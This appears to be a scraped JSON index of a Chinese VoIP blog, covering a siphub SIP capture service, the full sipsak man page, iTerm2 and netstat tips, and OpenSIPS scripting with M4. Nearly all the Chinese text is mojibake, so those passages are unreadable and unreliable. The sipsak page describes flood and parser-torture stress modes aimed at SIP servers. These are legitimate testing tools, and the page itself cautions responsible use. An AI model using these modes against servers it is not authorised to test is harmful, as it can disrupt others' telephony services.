Fromå­—æ®µä¹Ÿæ”¯æŒåç¼€æŸ¥è¯¢ï¼Œä¾‹å¦‚1234è¿™ç§å·ç ï¼Œå¯ä»¥åªè¾“å…¥234å°±èƒ½æŸ¥åˆ°ï¼Œä½†æ˜¯åç¼€è¦å†™å®Œæ•´ï¼ŒåªæŸ¥23æ˜¯æŸ¥ä¸åˆ°çš„ã€‚ Toå­—æ®µä»…ä»…æ”¯æŒç²¾ç¡®æŸ¥è¯¢ ä¿¡ä»¤å±•ç¤ºé¡µé¢ ç‚¹å‡»å¯¹åº”çš„æ¶ˆæ¯ï¼Œè¯¦æƒ…ä¹Ÿä¼šè‡ªåŠ¨è·³è½¬å‡ºæ¥ã€‚ å®‰è£… é¦–å…ˆéœ€è¦å®‰è£…MySqlæ•°æ®åº“ï¼Œå¹¶åœ¨å…¶ä¸­å»ºç«‹ä¸€ä¸ªåä¸ºsiphubçš„æ•°æ®åº“ è¿è¡Œ dbHost æ•°æ®åº“åœ°å€ dbUser æ•°æ®åº“ç”¨æˆ· dbName æ•°æ®åº“å dataKeepDays æŠ“åŒ…ä¿å­˜å¤©æ•° 3000ç«¯å£æ˜¯webé¡µé¢ç«¯å£ 9060æ˜¯hepæ¶ˆæ¯æ”¶å–ç«¯å£ docker run -d -p 3000:3000 -p 9060:9060/udp \\ --env NODE_ENV=production \\ --env dbHost=1.2.3.4 \\ --env dbUser=root \\ --env dbPwd=123456 \\ --env dbName=siphub \\ --env dataKeepDays=3 \\ --name siphub wangduanduan/siphub é›†æˆ OpenSIPSé›†æˆ test witch OpenSIPS 2.","title":"siphub è½»é‡çº§å®æ—¶SIPä¿¡ä»¤æ”¶åŒ…çš„æœåŠ¡"},{"content":"sipsak is a command line tool which can send simple requests to a SIP server. It can run additional tests on a SIP server which are usefull for admins and developers of SIP enviroments.\nhttps://github.com/nils-ohlmeier/sipsak\nå®‰è£… apt-get install sipsak å‘é€options sipsak -vv -p 192.168.2.63:5060 -s sip:8001@test.cc man SIPSAK(1) User Manuals SIPSAK(1) NAME sipsak - a utility for various tests on sip servers and user agents SYNOPSIS sipsak [-dFGhiILnNMRSTUVvwz] [-a PASSWORD ] [-b NUMBER ] [-c SIPURI ] [-C SIPURI ] [-D NUMBER ] [-e NUMBER ] [-E STRING ] [-f FILE ] [-g STRING ] [-H HOSTNAME ] [-j STRING ] [-J STRING ] [-l PORT ] [-m NUMBER ] [-o NUMBER ] [-p HOSTNAME ] [-P NUMBER ] [-q REGEXP ] [-r PORT ] [-t NUMBER ] [-u STRING ] [-W NUMBER ] [-x NUMBER ] -s SIPURI DESCRIPTION sipsak is a SIP stress and diagnostics utility. It sends SIP requests to the server within the sip-uri and examines received responses. It runs in one of the following modes: - default mode A SIP message is sent to destination in sip-uri and reply status is displayed. The request is either taken from filename or generated as a new OPTIONS message. - traceroute mode (-T) This mode is useful for learning request\u0026#39;s path. It operates similarly to IP-layer utility traceroute(8). - message mode (-M) Sends a short message (similar to SMS from the mobile phones) to a given target. With the option -B the content of the MESSAGE can be set. Useful might be the options -c and -O in this mode. - usrloc mode (-U) Stress mode for SIP registrar. sipsak keeps registering to a SIP server at high pace. Additionally the registrar can be stressed with the -I or the -M option. If -I and -M are omitted sipsak can be used to register any given contact (with the -C option) for an account at a registrar and to query the current bindings for an account at a registrar. - randtrash mode (-R) Parser torture mode. sipsak keeps sending randomly corrupted messages to torture a SIP server\u0026#39;s parser. - flood mode (-F) Stress mode for SIP servers. sipsak keeps sending requests to a SIP server at high pace. If libruli (http://www.nongnu.org/ruli/) or c-ares (http://daniel.haxx.se/projects/c-ares/) support is compiled into the sipsak binary, then first a SRV lookup for _sip._tcp.hostname is made. If that fails a SRV lookup for _sip._udp.hostname is made. And if this lookup fails a normal A lookup is made. If a port was given in the target URI the SRV lookup is omitted. Failover, load distribution and other transports are not supported yet. OPTIONS -a, --password PASSWORD With the given PASSWORD an authentication will be tryed on received \u0026#39;401 Unauthorized\u0026#39;. Authorization will be tryed on time. If this option is omitted an authorization with an empty password (\u0026#34;\u0026#34;) will be tryed. If the password is equal to - the password will be read from the standard input (e.g. the keyboard). This prevents other users on the same host from seeing the password the password in the process list. NOTE: the password still can be read from the memory if other users have access to it. -A, --timing prints only the timing values of the test run if verbosity is zero because no -v was given. If one or more -v were given this option will be ignored. -b, --apendix-begin NUMBER The starting number which is appended to the user name in the usrloc mode. This NUMBER is increased until it reaches the value given by the -e parameter. If omitted the starting number will be one. -B, --message-body STRING The given STRING will be used as the body for outgoing MESSAGE requests. -c, --from SIPURI The given SIPURI will be used in the From header if sipsak runs in the message mode (initiated with the -M option). This is helpful to present the receiver of a MESSAGE a meaningfull and usable address to where maybe even responses can be send. -C, --contact SIPURI This is the content of the Contact header in the usrloc mode. This allows to insert forwards like for mail. For example you can insert the uri of your first SIP account at a second account, thus all calls to the second account will be forâ€ warded to the first account. As the argument to this option will not be enclosed in brackets you can give also multiple contacts in the raw format as comma separated list. The special words empty or none will result in no contact header in the REGISTER request and thus the server should answer with the current bindings for the account at the registrar. The special words * or star will result in Contact header containing just a star, e.g. to remove all bindings by using expires value 0 together with this Contact. -d, --ignore-redirects If this option is set all redirects will be ignored. By default without this option received redirects will be respected. This option is automatically activated in the randtrash mode and in the flood mode. -D, --timeout-factor NUMBER The SIP_T1 timer is getting multiplied with the given NUMBER. After receiving a provisional response for an INVITE request, or when a reliable transport like TCP or TLS is used sipsak waits for the resulting amount of time for a final response until it gives up. -e, --appendix-end NUMBER The ending number which is appended to the user name in the usrloc mode. This number is increased until it reaches this ending number. In the flood mode this is the maximum number of messages which will be send. If omitted the default value is 2^31 (2147483647) in the flood mode. -E, --transport STRING The value of STRING will be used as IP transport for sending and receiving requests and responses. This option overâ€ writes any result from the URI evaluation and SRV lookup. Currently only \u0026#39;udp\u0026#39; and \u0026#39;tcp\u0026#39; are accepted as value for STRING. -f, --filename FILE The content of FILE will be read in in binary mode and will be used as replacement for the alternatively created sip mesâ€ sage. This can used in the default mode to make other requests than OPTIONS requests (e.g. INVITE). By default missing carriage returns in front of line feeds will be inserted (use -L to de-activate this function). If the filename is equal to - the file is read from standard input, e.g. from the keyboard or a pipe. Please note that the manipulation functions (e.g. inserting Via header) are only tested with RFC conform requests. Additionally special strings within the file can be replaced with some local or given values (see -g and -G for details). -F, --flood-mode This options activates the flood mode. In this mode OPTIONS requests with increasing CSeq numbers are sent to the server. Replies are ignored -- source port 9 (discard) of localhost is advertised in topmost Via. -h, --help Prints out a simple usage help message. If the long option --help is available it will print out a help message with the available long options. -g, --replace-string STRING Activates the replacement of $replace$ within the request (usually read in from a file) with the STRING. Alternatively you can also specify a list of attribute and values. This list has to start and end with a non alpha-numeric character. The same character has to be used also as separator between the attribute and the value and between new further attribute value pairs. The string \u0026#34;$attribute$\u0026#34; will be replaced with the value string in the message. -G, --replace Activates the automatic replacement of the following variables in the request (usually read in from a file): $dsthost$ will be replaced by with the host or domainname which is given by the -s parameter. $srchost$ will be replaced by the hostname of the local machine. $port$ will be replaced by the local listening port of sipsak. $user$ will be replaced by the username which is given by the -s parameter. -H, --hostname HOSTNAME Overwrites the automatic detection of the hostname with the given parameter. Warning: use this with caution (preferable only if the automatic detection fails). -i, --no-via Deactivates the insertion of the Via line of the localhost. Warning: this probably disables the receiving of the responses from the server. -I, --invite-mode Activates the Invites cycles within the usrloc mode. It should be combined with -U. In this combination sipsak first registeres a user, and then simulates an invitation to this user. First an Invite is sent, this is replied with 200 OK and finally an ACK is sent. This option can also be used without -U , but you should be sure to NOT invite real UAs with this option. In the case of a missing -U the -l PORT is required because only if you made a -U run with a fixed local port before, a run with -I and the same fixed local port can be successful. Warning: sipsak is no real UA and invitaâ€ tions to real UAs can result in unexpected behaivior. -j, --headers STRING The string will be added as one or more additional headers to the request. The string \u0026#34;\\n\u0026#34; (note: two characters) will be replaced with CRLF and thus result in two separate headers. That way more then one header can be added. -J, --autohash STRING The string will be used as the H(A1) input to the digest authentication response calculation. Thus no password from the -a option is required if this option is provided. The given string is expected to be a hex string with the length of the used hash function. -k, --local-ip STRING The local ip address to be used -l, --local-port PORT The receiving UDP socket will use the local network port. Useful if a file is given by -f which contains a correct Via line. Check the -S option for details how sipsak sends and receives messages. -L, --no-crlf De-activates the insertion of carriage returns (\\r) before all line feeds (\\n) (which is not already proceeded by carâ€ raige return) if the input is coming from a file ( -f ). Without this option also an empty line will be appended to the request if required. -m, --max-forwards NUMBER This sets the value of the Max-Forward header field. If omitted no Max-Forward field will be inserted. If omitted in the traceroute mode number will be 255. -M, --message-mode This activates the Messages cycles within the usrloc mode (known from sipsak versions pre 0.8.0 within the normal usrloc test). This option should be combined with -U so that a successful registration will be tested with a test message to the user and replied with 200 OK. But this option can also be used without the -U option. Warning: using without -U can cause unexpected behaivor. -n, --numeric Instead of the full qualified domain name in the Via line the IP of the local host will be used. This option is now on by default. -N, --nagios-code Use Nagios comliant return codes instead of the normal sipsak ones. This means sipsak will return 0 if everything was ok and 2 in case of any error (local or remote). -o, --sleep NUMBER sipsak will sleep for NUMBER ms before it starts the next cycle in the usrloc mode. This will slow down the whole test process to be more realistic. Each cycle will be still completed as fast as possible, but the whole test will be slowed down. -O, --disposition STRING The given STRING will be used as the content for the Content-Disposition header. Without this option there will be no Content-Disposition header in the request. -p, --outbound-proxy HOSTNAME[:PORT] the address of the hostname is the target where the request will be sent to (outgoing proxy). Use this if the destination host is different then the host part of the request uri. The hostname is resolved via DNS SRV if supported (see descripâ€ tion for SRV resolving) and no port is given. -P, --processes NUMBER Start NUMBER of processes in parallel to do the send and reply checking. Only makes sense if a higher number for -e is given in the usrloc, message or invite mode. -q, --search REGEXP match replies against REGEXP and return false if no match occurred. Useful for example to detect server name in Server header field. -r, --remote-port PORT Instead of the default sip port 5060 the PORT will be used. Alternatively the remote port can be given within the sip uri of the -s parameter. -R, --random-mode This activates the randtrash mode. In this mode OPTIONS requests will be send to server with increasing numbers of ranâ€ domly crashed characters within this request. The position within the request and the replacing character are randomly chosen. Any other response than Bad request (4xx) will stop this mode. Also three unresponded sends will stop this mode. With the -t parameter the maximum of trashed characters can be given. -s, --sip-uri SIPURI This mandatory option sets the destination of the request. It depends on the mode if only the server name or also an user name is mandatory. Example for a full SIPURI : sip:test@foo.bar:123 See the note in the description part about SRV lookups for details how the hostname of this URI is converted into an IP and port. -S, --symmetric With this option sipsak will use only one port for sending and receiving messages. With this option the local port for sending will be the value from the -l option. In the default mode sipsak sends from a random port and listens on the given port from the -l option. Note: With this option sipsak will not be able to receive replies from servers with asymâ€ metric signaling (and broken rport implementation) like the Cisco proxy. If you run sipsak as root and with raw socket support (check the output from the -V option) then this option is not required because in this case sipsak already uses only one port for sending and receiving messages. -t, --trash-chars NUMBER This parameter specifies the maximum of trashed characters in the randtrash mode. If omitted NUMBER will be set to the length of the request. -T, --traceroute-mode This activates the traceroute mode. This mode works like the well known traceroute(8) command expect that not the number of network hops are counted rather the number of server on the way to the destination user. Also the round trip time of each request is printed out, but due to a limitation within the sip protocol the identity (IP or name) can only deterâ€ mined and printed out if the response from the server contains a warning header field. In this mode on each outgoing request the value of the Max-Forwards header field is increased, starting with one. The maximum of the Max-Forwards header will 255 if no other value is given by the -m parameter. Any other response than 483 or 1xx are treated as a final response and will terminate this mode. -u, --auth-username STRING Use the given STRING as username value for the authentication (different account and authentication username). -U, --usrloc-mode This activates the usrloc mode. Without the -I or the -M option, this only registers users at a registrar. With one of the above options the previous registered user will also be probed ether with a simulated call flow (invite, 200, ack) or with an instant message (message, 200). One password for all users accounts within the usrloc test can be given with the -a option. An user name is mandatory for this mode in the -s parameter. The number starting from the -b parameter to the -e parameter is appended the user name. If the -b and the -e parameter are omitted, only one runs with the given userâ€ name, but without append number to the usernames is done. -v, --verbose This parameter increases the output verbosity. No -v means nearly no output except in traceroute and error messages. The maximum of three v\u0026#39;s prints out the content of all packets received and sent. -V, --version Prints out the name and version number of sipsak and the options which were compiled into the binary. -w, --extract-ip Activates the extraction of the IP or hostname from the Warning header field. -W, --nagios-warn NUMBER Return Nagios warn exit code (1) if the number of retransmissions before success was above the given number. -x, --expires NUMBER Sets the value of the Expires header to the given number. -z, --remove-bindings Activates the randomly removing of old bindings in the usrloc mode. How many per cent of the bindings will be removed, is determined by the USRLOC_REMOVE_PERCENT define within the code (set it before compilation). Multiple removing of bindâ€ ings is possible, and cannot be prevented. -Z, --timer-t1 Sets the amount of milliseconds for the SIP timer T1. It determines the length of the gaps between two retransmissions of a request on a unreliable transport. Default value is 500 if not changed via the configure option --enable-timeout. RETURN VALUES The return value 0 means that a 200 was received. 1 means something else then 1xx or 2xx was received. 2 will be returned on local errors like non resolvable names or wrong options combination. 3 will be returned on remote errors like socket errors (e.g. icmp error), redirects without a contact header or simply no answer (timeout). If the -N option was given the return code will be 2 in case of any (local or remote) error. 1 in case there have been retransâ€ missions from sipsak to the server. And 0 if there was no error at all. CAUTION Use sipsak responsibly. Running it in any of the stress modes puts substantial burden on network and server under test. EXAMPLES sipsak -vv -s sip:nobody@foo.bar displays received replies. sipsak -T -s sip:nobody@foo.bar traces SIP path to nobody. sipsak -U -C sip:me@home -x 3600 -a password -s sip:myself@company inserts forwarding from work to home for one hour. sipsak -f bye.sip -g \u0026#39;!FTAG!345.af23!TTAG!1208.12!\u0026#39; -s sip:myproxy reads the file bye.sip, replaces $FTAG$ with 345.af23 and $TTAG$ with 1208.12 and finally send this message to myproxy LIMITATIONS / NOT IMPLEMENTED Many servers may decide NOT to include SIP \u0026#34;Warning\u0026#34; header fields. Unfortunately, this makes displaying IP addresses of SIP servers in traceroute mode impossible. IPv6 is not supported. Missing support for the Record-Route and Route header. BUGS sipsak is only tested against the SIP Express Router (ser) though their could be various bugs. Please feel free to mail them to the author. AUTHOR Nils Ohlmeier \u0026lt;nils at sipsak dot org\u0026gt; SEE ALSO traceroute(8) ","permalink":"https://wdd.js.org/opensips/tools/sipsak/","summary":"sipsak is a command line tool which can send simple requests to a SIP server. It can run additional tests on a SIP server which are usefull for admins and developers of SIP enviroments.\nhttps://github.com/nils-ohlmeier/sipsak\nå®‰è£… apt-get install sipsak å‘é€options sipsak -vv -p 192.168.2.63:5060 -s sip:8001@test.cc man SIPSAK(1) User Manuals SIPSAK(1) NAME sipsak - a utility for various tests on sip servers and user agents SYNOPSIS sipsak [-dFGhiILnNMRSTUVvwz] [-a PASSWORD ] [-b NUMBER ] [-c SIPURI ] [-C SIPURI ] [-D NUMBER ] [-e NUMBER ] [-E STRING ] [-f FILE ] [-g STRING ] [-H HOSTNAME ] [-j STRING ] [-J STRING ] [-l PORT ] [-m NUMBER ] [-o NUMBER ] [-p HOSTNAME ] [-P NUMBER ] [-q REGEXP ] [-r PORT ] [-t NUMBER ] [-u STRING ] [-W NUMBER ] [-x NUMBER ] -s SIPURI DESCRIPTION sipsak is a SIP stress and diagnostics utility.","title":"sipsak"},{"content":"ä»¥å‰æœ‰ä¸ªiTerm2æœ‰ä¸ªå¾ˆè´´å¿ƒçš„åŠŸèƒ½ï¼Œé¼ æ ‡å‘ä¸‹æ»šåŠ¨æ—¶ï¼Œç›¸å…³å‘½ä»¤çš„è¾“å‡ºä¹Ÿä¼šè‡ªåŠ¨å‘ä¸‹ã€‚\nä½†æ˜¯ä¸çŸ¥é“æœ€è¿‘æ˜¯å‡çº§ç³»ç»Ÿè¿˜æ˜¯å‡çº§iTerm2çš„åŸå› ï¼Œè¿™ä¸ªåŠŸèƒ½å®ç°ä¸äº†ã€‚ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­\nä¾‹å¦‚ç”¨vimæ‰“å¼€ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œæˆ–è€…ä½¿ç”¨manå»æŸ¥çœ‹ä¸€ä¸ªå‘½ä»¤çš„ä»‹ç»æ–‡æ¡£æ—¶ã€‚å¦‚æœè¦æƒ³å‘ä¸‹æ»šåŠ¨å‘½ä»¤çš„è¾“å‡ºå†…å®¹ã€‚åªèƒ½æŒ‰jæˆ–è€…æŒ‰ç©ºæ ¼æˆ–è€…å›è½¦ã€‚ç„¶è€ŒæŒ‰é”®è™½ç„¶ç²¾ç¡®ï¼Œå´æ²¡æœ‰ç”¨è§¦æ‘¸æ¿æ»šåŠ¨æ¥çš„çˆ½ã€‚\nä¸ºäº†è®©vimèƒ½å¤Ÿæ¥å—é¼ æ ‡å‘ä¸‹æ»šåŠ¨åŠŸèƒ½ï¼Œæˆ‘ä¹Ÿæ›¾è®¾ç½®äº† set mouse=aÂ è¿™ä¸ªè®¾ç½®è™½ç„¶å¯ä»¥ç”¨è§¦æ‘¸æ¿æ¥å‘ä¸‹æ»šå±äº†ï¼Œä½†æ˜¯ä¹Ÿå‡ºç°äº†æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚\nç„¶åæˆ‘å°±å»ç ”ç©¶iTerm2çš„é…ç½®ï¼Œå‘ç°å…³äºé¼ æ ‡çš„é…ç½®ä¸­ï¼Œæœ‰ä¸€ä¸ª Scroll wheel send arrow keys when in alternat screen modeÂ , æŠŠè¿™ä¸ªæŒ‡è®¾ç½®ä¸ºYesã€‚é‚£ä¹ˆæ— è®ºVimï¼Œ è¿˜æ˜¯manå‘½ä»¤ï¼Œéƒ½å¯ä»¥ç”¨è§¦æ‘¸æ¿å»æ»šåŠ¨å±å¹•äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2020/07/gon16g/","summary":"ä»¥å‰æœ‰ä¸ªiTerm2æœ‰ä¸ªå¾ˆè´´å¿ƒçš„åŠŸèƒ½ï¼Œé¼ æ ‡å‘ä¸‹æ»šåŠ¨æ—¶ï¼Œç›¸å…³å‘½ä»¤çš„è¾“å‡ºä¹Ÿä¼šè‡ªåŠ¨å‘ä¸‹ã€‚\nä½†æ˜¯ä¸çŸ¥é“æœ€è¿‘æ˜¯å‡çº§ç³»ç»Ÿè¿˜æ˜¯å‡çº§iTerm2çš„åŸå› ï¼Œè¿™ä¸ªåŠŸèƒ½å®ç°ä¸äº†ã€‚ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­\nä¾‹å¦‚ç”¨vimæ‰“å¼€ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œæˆ–è€…ä½¿ç”¨manå»æŸ¥çœ‹ä¸€ä¸ªå‘½ä»¤çš„ä»‹ç»æ–‡æ¡£æ—¶ã€‚å¦‚æœè¦æƒ³å‘ä¸‹æ»šåŠ¨å‘½ä»¤çš„è¾“å‡ºå†…å®¹ã€‚åªèƒ½æŒ‰jæˆ–è€…æŒ‰ç©ºæ ¼æˆ–è€…å›è½¦ã€‚ç„¶è€ŒæŒ‰é”®è™½ç„¶ç²¾ç¡®ï¼Œå´æ²¡æœ‰ç”¨è§¦æ‘¸æ¿æ»šåŠ¨æ¥çš„çˆ½ã€‚\nä¸ºäº†è®©vimèƒ½å¤Ÿæ¥å—é¼ æ ‡å‘ä¸‹æ»šåŠ¨åŠŸèƒ½ï¼Œæˆ‘ä¹Ÿæ›¾è®¾ç½®äº† set mouse=aÂ è¿™ä¸ªè®¾ç½®è™½ç„¶å¯ä»¥ç”¨è§¦æ‘¸æ¿æ¥å‘ä¸‹æ»šå±äº†ï¼Œä½†æ˜¯ä¹Ÿå‡ºç°äº†æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚\nç„¶åæˆ‘å°±å»ç ”ç©¶iTerm2çš„é…ç½®ï¼Œå‘ç°å…³äºé¼ æ ‡çš„é…ç½®ä¸­ï¼Œæœ‰ä¸€ä¸ª Scroll wheel send arrow keys when in alternat screen modeÂ , æŠŠè¿™ä¸ªæŒ‡è®¾ç½®ä¸ºYesã€‚é‚£ä¹ˆæ— è®ºVimï¼Œ è¿˜æ˜¯manå‘½ä»¤ï¼Œéƒ½å¯ä»¥ç”¨è§¦æ‘¸æ¿å»æ»šåŠ¨å±å¹•äº†ã€‚","title":"iTerm2 ä½¿ç”¨è§¦æ‘¸ç‰ˆå‘ä¸‹æ»šåŠ¨å‘½ä»¤è¾“å‡º"},{"content":"Macä¸Šçš„netstatå’ŒLinuxä¸Šçš„æœ‰ä¸å°‘çš„ä¸åŒä¹‹å¤„ã€‚\nåœ¨Liunxä¸Šå¸¸ä½¿ç”¨\nLinux Mac netstat -nulp netstat -nva -p udp netsat -ntlp netsat -nva -p tcp æ³¨æ„ï¼Œåœ¨Macä¸Šnetstatçš„-nå’Œlinuxä¸Šçš„å«ä¹‰ç›¸åŒ\n","permalink":"https://wdd.js.org/posts/2020/07/hingbv/","summary":"Macä¸Šçš„netstatå’ŒLinuxä¸Šçš„æœ‰ä¸å°‘çš„ä¸åŒä¹‹å¤„ã€‚\nåœ¨Liunxä¸Šå¸¸ä½¿ç”¨\nLinux Mac netstat -nulp netstat -nva -p udp netsat -ntlp netsat -nva -p tcp æ³¨æ„ï¼Œåœ¨Macä¸Šnetstatçš„-nå’Œlinuxä¸Šçš„å«ä¹‰ç›¸åŒ","title":"macä¸Šnetstatå‘½ä»¤"},{"content":"opensipsåœ¨å¤šå®ä¾‹æ—¶ï¼Œä¼šæœ‰ä¸€äº›æ•°æ®åŒæ­¥ç­–ç•¥çš„é—®é¢˜ã€‚\nï½\n","permalink":"https://wdd.js.org/opensips/ch5/db-mode/","summary":"opensipsåœ¨å¤šå®ä¾‹æ—¶ï¼Œä¼šæœ‰ä¸€äº›æ•°æ®åŒæ­¥ç­–ç•¥çš„é—®é¢˜ã€‚\nï½","title":"[todo] db_modeè°ƒä¼˜"},{"content":"ç›¸æ¯”äºkamailoçš„è„šæœ¬çš„é¢„å¤„ç†èƒ½åŠ›ï¼Œopensipsçš„è„šæœ¬ç•¥æ˜¾å•è–„ã€‚OpenSIPSå®˜æ–¹ä¹Ÿè®¤è¯†åˆ°äº†è¿™ä¸€ç‚¹ï¼Œä½†æ˜¯ä¹Ÿå¹¶æœªå‡†å¤‡å¦‚ä½•æé«˜è¿™éƒ¨åˆ†èƒ½åŠ›ã€‚å› ä¸ºOpenSIPSæ˜¯æƒ³å°†é¢„å¤„ç†äº¤ç»™è¿™æ–¹é¢çš„ä¸“å®¶ï¼Œä¹Ÿå°±æ˜¯å¤§åé¼é¼çš„m4(å½“ç„¶ï¼Œä½ å¯èƒ½æ ¹æœ¬ä¸çŸ¥é“m4æ˜¯å•¥)ã€‚\nä¸¾ä¾‹æ¥è¯´ æˆ‘ä»¬çœ‹ä¸€ä¸‹opensipsè‡ªå¸¦è„šæœ¬çš„ä¸­çš„ä¸€å°å—ã€‚ é‡Œé¢å°±æœ‰ä¸‰ä¸ªè¦é…ç½®çš„åœ°æ–¹\nè¿™ä¸ªlistençš„åœ°å€ï¼š listen=udp:127.0.0.1:5060 æ•°æ®åº“åœ°å€çš„é…ç½®ï¼šmodparam(\u0026ldquo;usrloc\u0026rdquo;, \u0026ldquo;db_url\u0026rdquo;, \u0026ldquo;dbdriver://username:password@dbhost/dbname\u0026rdquo;) æ•°æ®åº“åœ°å€çš„é…ç½®ï¼šmodparam(\u0026ldquo;acc\u0026rdquo;, \u0026ldquo;db_url\u0026rdquo;, \u0026ldquo;mysql://user:password@localhost/opensips\u0026rdquo;) auto_aliases=no listen=udp:127.0.0.1:5060 # CUSTOMIZE ME mpath=\u0026#34;/usr/local//lib/opensips/modules/\u0026#34; loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;dbdriver://username:password@dbhost/dbname\u0026#34;) modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://user:password@localhost/opensips\u0026#34;) éšç€è„šæœ¬ä»£ç çš„å¢å¤šï¼Œå„ç§é…ç½®å¾€å¾€è¶Šæ¥è¶Šå¤šã€‚çœŸæ˜¯è„šæœ¬é‡Œï¼Œé…ç½®çš„åœ°æ–¹è¿œè¿œä¸æ­¢ä¸‰å¤„ï¼\nä½ å¼€å‘äº†OpenSIPSçš„è„šæœ¬ï¼Œä½†æ˜¯çœŸæ­£éƒ¨ç½²çš„æœåŠ¡çš„å¯èƒ½æ˜¯å…¶ä»–äººã€‚é‚£ä¹ˆå…¶ä»–æ‹¿åˆ°ä½ çš„è„šæœ¬çš„æ—¶å€™ï¼Œä»–ä»¬æ€ä¹ˆçŸ¥é“è¦æ”¹å“ªäº›åœ°æ–¹å‘¢ï¼Œéš¾é“è¦æœç´¢ä¸€ä¸‹ï¼Œæ‰€æœ‰å‡ºç°#CUSTOMIZE MEçš„åœ°æ–¹å°±æ˜¯éœ€è¦é…ç½®çš„ï¼Ÿ éš¾é“ä»–ä»¬æ¯æ¬¡éƒ¨ç½²ä¸€ä¸ªæœåŠ¡ï¼Œå°±è¦æ”¹ä¸€éè„šæœ¬çš„å†…å®¹ï¼Ÿ æ”¹é”™äº†è°è´Ÿè´£ï¼Ÿ\nå¦‚æœä½ ä¸æƒ³è¢«è¿ç»´äººå‘˜åœ¨èƒŒåéª‚å¨˜ï¼Œå°±ä¸è¦æŠŠé…ç½®æ€§çš„æ•°æ®å†™æ­»åˆ°è„šæœ¬é‡Œï¼\nå¦‚æœä½ ä¸æƒ³åœ¨æ‰“æ¸¸æˆçš„æ—¶å€™è¢«è¿ç»´äººå‘˜ç‚¹ç”µè¯é—®è¿™ä¸ªé…ç½®å‡ºé”™åº”è¯¥æ€ä¹ˆè§£å†³ï¼Œå°±ä¸è¦æŠŠé…ç½®å‹æ•°æ®å†™æ­»åˆ°è„šæœ¬é‡Œï¼\n** é‚£ä¹ˆï¼Œä½ å°±éœ€è¦ç”¨åˆ°M4**\nä»€ä¹ˆæ˜¯M4ï¼Ÿ M4æ˜¯ä¸€ç§å®è¯­è¨€ï¼Œå¦‚æœä½ ä¸æ¸…æ¥šä»€ä¹ˆæ˜¯å®ï¼Œä½ å°±å¯ä»¥æŠŠM4æƒ³æƒ³æˆä¸€ç§å­—ç¬¦ä¸²æ›¿æ¢çš„å·¥å…·ã€‚\nå¦‚ä½•å®‰è£…M4? å¤§éƒ¨åˆ†Linuxä¸Šéƒ½å·²ç»é»˜è®¤å®‰è£…äº†m4, ä½ å¯ä»¥ç”¨m4 --versionæ£€æŸ¥ä¸€ä¸‹m4æ˜¯å¦å·²ç»å­˜åœ¨ã€‚\nm4 --version Copyright Â© 2021 Free Software Foundation, Inc. GPLv3+ è®¸å¯è¯: GNU é€šç”¨å…¬å…±è®¸å¯è¯ç¬¬ä¸‰ç‰ˆæˆ–æ›´é«˜ç‰ˆæœ¬ \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;ã€‚ è¿™æ˜¯è‡ªç”±è½¯ä»¶: æ‚¨å¯è‡ªç”±æ›´æ”¹å¹¶é‡æ–°åˆ†å‘å®ƒã€‚ åœ¨æ³•å¾‹æ‰€å…è®¸çš„èŒƒå›´å†…ï¼Œä¸é™„å¸¦ä»»ä½•æ‹…ä¿æ¡æ¬¾ã€‚ å¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå¯ä»¥ç”¨å¯¹åº”å¸¸ç”¨çš„åŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…ï¼Œä¾‹å¦‚\napt-get install m4 èƒ½å¦ä¸¾ä¸ªm4ä¾‹å­ï¼Ÿ hello-world.m4\ndefine(`hello_world\u0026#39;, `ä½ å¥½ï¼Œä¸–ç•Œ\u0026#39;) å°ç‹è¯´: hello_world ç„¶åæ‰§è¡Œ: m4 hello-world.m4\nå°ç‹è¯´: ä½ å¥½ï¼Œä¸–ç•Œ æ•ˆæœå°±æ˜¯ hello_worldè¿™ä¸ªå­—ç¬¦ï¼Œè¢«æˆ‘ä»¬å®šä¹‰çš„å­—ç¬¦ä¸²ç»™æ›¿æ¢äº†ã€‚\nä¸ºä»€ä¹ˆè¦åšé¢„å¤„ç†ï¼Ÿ æˆ‘ç®¡ç†è¿‡çš„OpenSIPSè„šæœ¬ï¼Œæœ€é•¿çš„å¤§æ¦‚æœ‰1500è¡Œå·¦å³ã€‚åˆšå¼€å§‹æ¥æ‰‹çš„æ—¶å€™ï¼Œæˆ‘èŠ±äº†å¾ˆé•¿æ—¶é—´æ‰ç†æ¸…è„šæœ¬çš„åŠŸèƒ½ã€‚\nè¿™ä¸ªè„šæœ¬çš„å­˜åœ¨çš„é—®é¢˜æ˜¯ï¼š\nå¤§æ®µçš„é€»è¾‘éƒ½é›†ä¸­åœ¨è¯·æ±‚è·¯ç”±ä¸­ï¼ŒåŠŸèƒ½æ¯”è¾ƒç¼ ç»•ï¼Œå¾ˆå®¹æ˜“æ”¹åŠ¨ä¸€ä¸ªåœ°æ–¹ï¼Œå¯¼è‡´ä¸å¯é¢„æµ‹çš„é—®é¢˜ é…ç½®æ€§çš„å˜é‡å’Œè„šæœ¬èåˆåœ¨ä¸€èµ·ï¼Œè„šæœ¬è¿ç§»æ—¶ï¼Œè¦æ”¹åŠ¨çš„åœ°æ–¹æ¯”è¾ƒå¤šï¼Œå®¹æ˜“å‡ºé”™ æŸäº›ç¯å¢ƒéœ€è¦æŸäº›åŠŸèƒ½ï¼ŒæŸäº›ç¯å¢ƒæœ‰ä¸éœ€è¦æŸäº›åŠŸèƒ½ï¼Œå¾ˆéš¾åšåˆ°å…¼å®¹ï¼Œç»“æœå°±å¯¼è‡´è„šæœ¬çš„ç‰ˆæœ¬å¤ªå¤šï¼Œéš¾ä»¥ç»´æŠ¤ 